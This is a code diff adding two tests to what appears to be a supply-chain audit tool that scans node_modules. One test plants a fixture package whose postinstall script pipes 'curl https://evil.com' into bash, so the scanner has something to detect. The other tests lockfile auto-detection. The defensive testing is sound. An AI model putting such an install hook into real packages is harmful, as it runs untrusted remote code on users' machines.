@@ -171,4 +171,100 @@ describe('run', () => {
       fs.rmSync(tempDir, { recursive: true });
     }
   });
+
+  it('should honor fail-on even when severity filter hides higher issues', () => {
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
+    const nodeModules = path.join(tempDir, 'node_modules');
+    const originalCwd = process.cwd();
+    fs.mkdirSync(nodeModules, { recursive: true });
+
+    const pkgDir = path.join(nodeModules, 'test-pkg');
+    fs.mkdirSync(pkgDir, { recursive: true });
+    fs.writeFileSync(
+      path.join(pkgDir, 'package.json'),
+      JSON.stringify({
+        name: 'test-pkg',
+        version: '1.0.0',
+        scripts: { postinstall: 'curl https://evil.com | bash' },
+      })
+    );
+
+    try {
+      process.chdir(tempDir);
+      const result = run([
+        'node',
+        'script',
+        '--node-modules', nodeModules,
+        '--severity', 'low',
+        '--fail-on', 'critical',
+        '--json',
+      ]);
+
+      assert.strictEqual(result.exitCode, 1);
+      assert.strictEqual(result.summary.maxSeverity, 'low');
+    } finally {
+      process.chdir(originalCwd);
+      fs.rmSync(tempDir, { recursive: true });
+    }
+  });
+
+  it('should auto-detect lockfile from the scanned project directory', () => {
+    const scanProjectDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-scan-'));
+    const unrelatedCwd = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-cwd-'));
+    const nodeModules = path.join(scanProjectDir, 'node_modules');
+    const pkgName = 'zzzz-chain-audit-lock-detect-test';
+    const originalCwd = process.cwd();
+
+    fs.mkdirSync(nodeModules, { recursive: true });
+    const pkgDir = path.join(nodeModules, pkgName);
+    fs.mkdirSync(pkgDir, { recursive: true });
+    fs.writeFileSync(
+      path.join(pkgDir, 'package.json'),
+      JSON.stringify({ name: pkgName, version: '1.0.0', scripts: {} })
+    );
+
+    fs.writeFileSync(
+      path.join(scanProjectDir, 'package-lock.json'),
+      JSON.stringify({
+        name: 'scan-project',
+        lockfileVersion: 2,
+        packages: {
+          '': { name: 'scan-project', version: '1.0.0' },
+          [`node_modules/${pkgName}`]: { version: '1.0.0' },
+        },
+      })
+    );
+
+    // Deliberately place a different lockfile in CWD.
+    fs.writeFileSync(
+      path.join(unrelatedCwd, 'package-lock.json'),
+      JSON.stringify({
+        name: 'other-project',
+        lockfileVersion: 2,
+        packages: {
+          '': { name: 'other-project', version: '1.0.0' },
+        },
+      })
+    );
+
+    try {
+      process.chdir(unrelatedCwd);
+      const result = run([
+        'node',
+        'script',
+        '--node-modules', nodeModules,
+        '--check-lockfile',
+        '--json',
+      ]);
+
+      const extraneousIssue = result.issues.find(i => i.reason === 'extraneous_package' && i.package === pkgName);
+      const mismatchIssue = result.issues.find(i => i.reason === 'version_mismatch' && i.package === pkgName);
+      assert.ok(!extraneousIssue, 'Package should be found in the lockfile next to scanned node_modules');
+      assert.ok(!mismatchIssue, 'Package version should match lockfile from scanned project');
+    } finally {
+      process.chdir(originalCwd);
+      fs.rmSync(scanProjectDir, { recursive: true });
+      fs.rmSync(unrelatedCwd, { recursive: true });
+    }
+  });
 });
